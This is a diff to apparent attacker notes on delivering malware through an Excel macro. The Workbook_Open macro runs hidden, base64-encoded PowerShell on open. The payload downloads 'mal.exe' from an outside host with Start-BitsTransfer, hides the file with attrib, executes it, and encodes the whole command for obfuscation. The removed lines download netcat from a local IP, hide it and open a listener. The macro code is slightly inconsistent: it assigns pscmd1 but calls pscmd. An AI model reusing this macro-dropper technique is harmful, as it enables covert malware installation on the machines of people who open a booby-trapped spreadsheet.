@@ -6,7 +6,9 @@
     You can using it to macro in excel but it can be blocked powershell, so you can run using cmd like below.
     
     Private Sub Workbook_Open()
-    pscmd = "cmd /k powershell.exe -noP -sta -w 1 -enc endcodeData"
+    # powershell.exe -noP -sta -w 1
+    pscmd1 = "cmd /k powershell.exe -enc endcodeData" # if encoded by base64
+    pscmd1 = "cmd /k powershell.exe -command { endcodeData }" # if encoded by binary
     Call Shell(pscmd, vbNormalFocus)
     End Sub
 
@@ -35,16 +37,17 @@ Write-Host $Encoded
 $Encoded.split("|") | % { if($_ -ne "" ) { $Decoded += [char][convert]::Toint32($_,2)} }
 Write-Host $Decoded
 
-# encode by base64
+<# encode by base64
+cmd /k powershell 
+#>
 $server = "http://malware.com/mal.exe"
-$output = "C:\WINDOWS\SYSTEM32\mal.exe"
+$output = "$env:USERPROFILE\Documents\mal.exe"
 
 $sTR = "Start-BitsTransfer -Source $server -Destination $output"
-$Encoded = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($sTR))
+$option = "; powershell.exe attrib +H +S $output; powershell $output"
+$payload = $sTR + $option
+
+$Encoded = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($payload))
 $Decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Encoded))
 Write-Host $Encoded
 Write-Host $Decoded
-powershell.exe -noP -sta -w 1 -enc $Encoded
-
-(New-Object Net.WebClient).DownloadFile("http://192.168.219.102/nc64.exe","$env:USERPROFILE\Documents\omd.exe"); powershell.exe attrib +H +S "C:\Users\ysa72\Documents\omd.e
-xe"; powershell.exe "$env:USERPROFILE\Documents\omd.exe -l -p 8888"
